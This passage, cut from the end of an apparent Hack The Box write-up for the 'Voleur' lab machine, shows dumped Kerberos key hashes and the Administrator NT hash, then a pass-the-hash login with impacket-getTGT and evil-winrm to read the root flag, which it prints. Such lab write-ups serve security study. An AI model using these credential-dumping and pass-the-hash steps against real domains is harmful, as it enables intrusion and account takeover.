</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_ldap:des-cbc-md5:1ab0fbfeeaef5776
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_backup:des-cbc-md5:7ab513f8ab7f765e
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_iis:des-cbc-md5:70ce25431c577f92
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\j</span>eremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\j</span>eremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\j</span>eremy.combs:des-cbc-md5:192f702abff75257
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_winrm:des-cbc-md5:32b61fb92a7010ab
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
</span></span></code></pre></td></tr></table>
</div>
</div><p>The secrets extraction phase utilized Impacket&rsquo;s secretsdump tool to parse the Active Directory database and registry hives. This process extracted all domain user password hashes, including the Domain Administrator account, effectively providing complete domain compromise.</p>
<p><strong>Administrator NT Hash :</strong> aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2</p>
<hr>
<h2 id="phase-6-domain-admin"><strong>Phase 6: Domain Admin</strong><a href="#phase-6-domain-admin" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 
</span></span><span style="display:flex;"><span>2025-07-06 22:56:51.853291 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.933401 +/- 0.013588 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.933401
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache
</span></span><span style="display:flex;"><span>                             
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# export KRB5CCNAME<span style="color:#f92672">=</span>/home/hexhunter404/Downloads/Administrator.ccache                                                                                                    
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
</span></span><span style="display:flex;"><span>2025-07-06 22:57:42.293729 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.927044 +/- 0.011306 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.927044
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; cd Desktop
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
</span></span><span style="display:flex;"><span>-a----         1/29/2025   1:12 AM           <span style="color:#ae81ff">2308</span> Microsoft Edge.lnk
</span></span><span style="display:flex;"><span>-ar---          7/5/2025   8:38 PM             <span style="color:#ae81ff">34</span> root.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; cat root.txt
</span></span><span style="display:flex;"><span>092ea0c8c50e977873d72cf015ba61d2
</span></span></code></pre></td></tr></table>
</div>
</div><p>The final phase utilized the extracted Administrator hash to perform a pass-the-hash attack, obtaining a Kerberos ticket without knowing the plaintext password. This technique demonstrates how compromised password hashes can be leveraged for authentication in Windows environments.</p>
<p>The successful acquisition of Domain Administrator privileges provided complete control over the voleur.htb domain. This level of access allows for data exfiltration, system modification, and establishment of persistent access mechanisms.</p>
<p><strong>Root Flag:</strong> 092ea0c8c50e977873d72cf015ba61d2</p>
<p>Writeup completed by HexHunter404 - HTB Pro Hacker #544
Machine solved on: [Date] | Writeup published on: {{ .Date.Format &ldquo;August 1, 2025&rdquo; }}</p>

      </div></div>

  
    

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
